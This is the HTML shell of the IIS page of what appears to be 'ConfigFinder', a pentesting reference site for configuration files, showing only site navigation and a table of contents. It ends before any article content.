
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="The GTFOBins of configuration files - Quick reference for pentesters">
      
      
        <meta name="author" content="EPIHACK">
      
      
        <link rel="canonical" href="https://epihackbenin.github.io/ConfigFinder/services/web-servers/iis/">
      
      
        <link rel="prev" href="../nginx/">
      
      
        <link rel="next" href="../../databases/">
      
      
        
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>IIS - ConfigFinder</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="teal">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#iis-internet-information-services" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="ConfigFinder" class="md-header__button md-logo" aria-label="ConfigFinder" data-md-component="logo">
      
  <img src="../../../material/shield-search" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            ConfigFinder
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              IIS
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/EPIHACKBENIN/ConfigFinder" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    EPIHACKBENIN/ConfigFinder
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../" class="md-tabs__link">
          
  
  
    
  
  Services

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../about/" class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../CONTRIBUTING/" class="md-tabs__link">
        
  
  
    
  
  Contributing

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="ConfigFinder" class="md-nav__button md-logo" aria-label="ConfigFinder" data-md-component="logo">
      
  <img src="../../../material/shield-search" alt="logo">

    </a>
    ConfigFinder
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/EPIHACKBENIN/ConfigFinder" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    EPIHACKBENIN/ConfigFinder
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Services
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Services
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Web Servers
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Web Servers
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../apache/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Apache
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nginx/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Nginx
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    IIS
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    IIS
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
    <span class="md-ellipsis">
      
        Description
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#configuration-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configuration Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#log-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Log Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sensitive-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sensitive Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-directories" class="md-nav__link">
    <span class="md-ellipsis">
      
        Data Directories
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pentest-tips" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pentest Tips
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      
        Useful Commands
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#known-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        Known Vulnerabilities
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hardening" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardening
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation-examples" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exploitation Examples
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metadata" class="md-nav__link">
    <span class="md-ellipsis">
      
        Metadata
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../databases/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Databases
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Databases
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mysql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MySQL
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/postgresql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PostgreSQL
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mongodb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MongoDB
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/redis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Redis
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../cms/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    CMS
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    CMS
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cms/wordpress/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    WordPress
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cms/drupal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Drupal
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../auth/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Authentication
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Authentication
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../auth/ssh/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SSH
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../auth/ftp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    FTP
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CONTRIBUTING/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Contributing
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
    <span class="md-ellipsis">
      
        Description
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#configuration-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configuration Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#log-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Log Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sensitive-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sensitive Files
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-directories" class="md-nav__link">
    <span class="md-ellipsis">
      
        Data Directories
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pentest-tips" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pentest Tips
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      
        Useful Commands
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#known-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        Known Vulnerabilities
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hardening" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardening
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation-examples" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exploitation Examples
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metadata" class="md-nav__link">
    <span class="md-ellipsis">
      
        Metadata
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation" >
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../../.." class="md-path__link">
        
  <span class="md-ellipsis">
    Home
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../../" class="md-path__link">
          
  <span class="md-ellipsis">
    Services
  </span>

        </a>
      </li>
    
  

      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../" class="md-path__link">
          
  <span class="md-ellipsis">
    Web Servers
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  


  
    <a href="https://github.com/EPIHACKBENIN/ConfigFinder/edit/main/docs/services/web-servers/iis.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
      
